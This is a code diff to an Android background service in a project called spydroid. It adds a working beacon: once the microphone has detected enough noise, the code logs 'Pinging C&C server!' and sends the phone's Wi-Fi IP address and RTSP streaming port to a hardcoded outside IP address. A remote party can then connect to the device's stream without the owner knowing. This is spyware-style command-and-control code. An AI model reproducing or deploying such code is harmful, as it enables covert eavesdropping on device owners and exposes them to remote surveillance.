@@ -1,12 +1,40 @@
 package net.majorkernelpanic.spydroid.ui;
 
 import android.app.Service;
+import android.content.Context;
 import android.content.Intent;
+import android.net.wifi.WifiInfo;
+import android.net.wifi.WifiManager;
 import android.os.Binder;
 import android.os.Handler;
 import android.os.IBinder;
 import android.media.MediaRecorder;
 import android.util.Log;
+import net.majorkernelpanic.spydroid.SpydroidApplication;
+import net.majorkernelpanic.spydroid.Utilities;
+import org.apache.http.HttpHost;
+import org.apache.http.HttpRequest;
+import org.apache.http.HttpResponse;
+import org.apache.http.NameValuePair;
+import org.apache.http.client.ClientProtocolException;
+import org.apache.http.client.HttpClient;
+import org.apache.http.client.ResponseHandler;
+import org.apache.http.client.entity.UrlEncodedFormEntity;
+import org.apache.http.client.methods.HttpPost;
+import org.apache.http.client.methods.HttpUriRequest;
+import org.apache.http.conn.ClientConnectionManager;
+import org.apache.http.impl.client.DefaultHttpClient;
+import org.apache.http.message.BasicNameValuePair;
+import org.apache.http.params.HttpParams;
+import org.apache.http.protocol.HttpContext;
+
+import java.util.ArrayList;
+import java.util.List;
+
+import java.io.*;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.util.Locale;
 
 public class ListenerService extends Service {
 
@@ -76,6 +104,7 @@ public class ListenerService extends Service {
 
     @Override
     public void onDestroy() {
+        mHandler.removeCallbacks(mPollTask);
         mSensor.stop();
 
     }
@@ -117,11 +146,50 @@ public class ListenerService extends Service {
                 if ((++mHitCount) > COUNT_THRESHOLD) {
                     // Do something here!
                     Log.d("SoundService", "Pinging C&C server!");
+                    new Thread(new Runnable() {
+                        @Override
+                        public void run() {
+                            try {
+                                WifiManager wifiManager = (WifiManager) SpydroidApplication.getContext().getSystemService(Context.WIFI_SERVICE);
+                                WifiInfo info = wifiManager.getConnectionInfo();
+                                if (info!=null && info.getNetworkId()>-1) {
+
+                                    // Create a new HttpClient and Post Header
+                                    HttpClient httpclient = new DefaultHttpClient();
+                                    HttpPost httppost = new HttpPost(String.format("http://%s:3000/stream/test", "67.194.202.219"));
+
+
+                                    int i = info.getIpAddress();
+                                    String ip = String.format(Locale.ENGLISH,"%d.%d.%d.%d", i & 0xff, i >> 8 & 0xff,i >> 16 & 0xff,i >> 24 & 0xff);
+                                    String port = String.valueOf(SpydroidApplication.sRtspPort);
+
+                                    // Add your data
+                                    List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
+                                    nameValuePairs.add(new BasicNameValuePair("ip", ip));
+                                    nameValuePairs.add(new BasicNameValuePair("port", port));
+                                    httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
+
+
+                                    // Execute HTTP Post Request
+                                    HttpResponse response = httpclient.execute(httppost);
+                                }   else {
+                                    Log.d("Listener", "Wifi is disabled.");
+                                }
+                            }
+                            catch(Exception e){
+                                Log.d("Listener", "Exception!");
+                                e.printStackTrace();
+                            }
+                        }
+                    }).start();
                     mTickCount = 0;
                     mHitCount  = 0;
+                    mHandler.postDelayed(mPollTask, 10 * (POLL_INTERVAL + 700));
+                    return;
                 } else {
                     Log.d("ListenerService", "Heard noise, polling sooner.");
-                    mHandler.postDelayed(mPollTask, POLL_INTERVAL/3);
+
+                    mHandler.postDelayed(mPollTask, POLL_INTERVAL / 3);
                     return;
                 }
             }
@@ -130,7 +198,7 @@ public class ListenerService extends Service {
                 Log.d("ListenerService", "Running again in 3 seconds...");
                 mTickCount = 0;
                 mHitCount  = 0;
-                mHandler.postDelayed(mPollTask, POLL_INTERVAL * 1000);
+                mHandler.postDelayed(mPollTask, (POLL_INTERVAL + 700) * 3);
             } else {
                 Log.d("ListenerService", "Running again shortly");
                 mHandler.postDelayed(mPollTask, POLL_INTERVAL);
